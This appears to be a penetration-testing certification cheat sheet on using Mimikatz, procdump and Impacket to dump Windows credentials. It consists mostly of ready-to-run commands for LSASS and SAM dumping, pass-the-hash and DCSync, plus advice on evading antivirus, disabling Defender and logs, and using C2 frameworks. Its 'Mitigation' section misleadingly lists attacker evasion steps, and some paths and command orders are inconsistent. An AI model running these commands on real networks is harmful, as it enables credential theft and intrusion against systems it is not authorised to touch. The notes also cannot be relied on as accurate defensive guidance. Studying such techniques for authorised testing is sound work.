# Mimikatz Usage & Execution - CPTS Notes

---

# 🧩 1. Overview

- Tool: Mimikatz
- Purpose: Extract credentials from Windows memory
- Target: LSASS (Local Security Authority Subsystem Service)

✔ Used in:
- Post-exploitation
- Credential dumping
- Lateral movement

---

# ⚙️ 2. Setup & Execution

## Download & Setup

```
unzip mimikatz_trunk.zip -d mimikatz
mv -v mimikatz /opt/share/mimikatz
cd /opt/mimikatz/
```

---

## Run Mimikatz

```
mimikatz
```

---

## Help

```
mimikatz --help
```

---

# 🔐 3. Prerequisites

## 1. Administrator Privileges
- Required to access LSASS memory

---

## 2. Debug Privileges

```
mimikatz # privilege::debug
```

✔ Needed for:
- Reading LSASS memory
- Credential extraction

---

## 3. AV / EDR Considerations
- Windows Defender, CrowdStrike, SentinelOne detect Mimikatz
- Use:
  - Obfuscated binaries
  - Custom builds
  - In-memory execution

---

## 4. LSASS Protection

- Credential Guard → blocks access
- LSASS Protection (RunAsPPL) → restricts memory access

---

## 5. Architecture Check

```
systeminfo | findstr /C:"System Type"
```

- Use matching version:
  - 32-bit → x86
  - 64-bit → x64

---

## 6. Trusted Location

Run from:
```
C:\Windows\System32
C:\Users\<user>\Documents
```

---

## 7. LSASS Access

- Required for:
```
sekurlsa::logonpasswords
```

---

## 8. Remote Execution

Tools:
- psexec
- WinRM

---

# 💻 4. Local Credential Dumping

## Start Session

```
mimikatz.exe
```

---

## Enable Debug

```
mimikatz # privilege::debug
```

---

## Dump Credentials

```
mimikatz # sekurlsa::logonpasswords
```

---

## Dump SAM

```
mimikatz # lsadump::sam
```

---

## Patch LSA

```
mimikatz # lsadump::lsa /patch
```

---

## One-Liner

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

---

## Save Output

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit >> hash.txt
```

---

# 🧠 5. LSASS Dump (Offline)

## Dump LSASS

### 32-bit

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### 64-bit

```
procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

---

## Analyze Dump

```
mimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

---

## Save Output

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" exit >> hash.txt
```

---

## Alternative (pypykatz)

```
pypykatz lsa minidump lsass.dmp
```

---

## Pass-the-Hash

```
evil-winrm -u administrator -H <hash> -i <IP>
```

---

# 🌐 6. Online vs Offline Dumping

## Online

```
mimikatz # lsadump::sam
mimikatz # privilege::debug
mimikatz # token::whoami
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
```

---

## Offline

```
mimikatz # lsadump::sam /system:System /sam:Sam
```

---

## Combined Command

```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"
```

---

# 🛡️ 7. Detection & Mitigation

## Detection

- Windows Event Logs:
  - 4688 → Process creation
  - 4624 → Logon events

- EDR detects:
  - Mimikatz signatures
  - LSASS access

---

## Protections

- Credential Guard
- LSASS Protection

---

## Mitigation

- Obfuscate binaries
- Run in memory (PowerShell, Cobalt Strike)
- Disable Defender/EDR (if allowed)

---

# 🔄 8. Alternatives (Impacket)

## secretsdump

```
secretsdump.py -just-dc-ntlm DOMAIN/Administrator@TARGET_IP
```

```
secretsdump.py user:pass@192.168.1.51
```

---

## Local Dump

```
secretsdump.py -sam TARGET_IP -u Administrator -p Password123
```

---

## Remote Execution

```
psexec.py DOMAIN/Administrator@TARGET_IP -c mimikatz.exe
```

---

## LSASS Dump

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

---

## Parse Dump

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

---

## DCSync

```
wmiexec.py DOMAIN/Administrator@DC_IP "mimikatz.exe \"lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv\""
```

OR

```
secretsdump.py -just-dc DOMAIN/Administrator@DC_IP
```

---

# 🚫 9. Bypassing Detection

- Use encrypted C2 (Cobalt Strike, Havoc, Mythic)
- Obfuscate binaries
- Disable logs/Defender temporarily

---

# 🧠 10. Key Notes (CPTS)

- Requires admin/SYSTEM
- Targets LSASS memory
- Works best in post-exploitation
- Highly detectable → use evasion
- Offline dumping = stealthier

---

# 🔥 CPTS Quick Cheatsheet

| Action              | Command |
|-------------------|--------|
| Enable Debug       | privilege::debug |
| Dump creds         | sekurlsa::logonpasswords |
| Dump SAM           | lsadump::sam |
| Load dump          | sekurlsa::minidump |
| DCSync             | lsadump::dcsync |

---
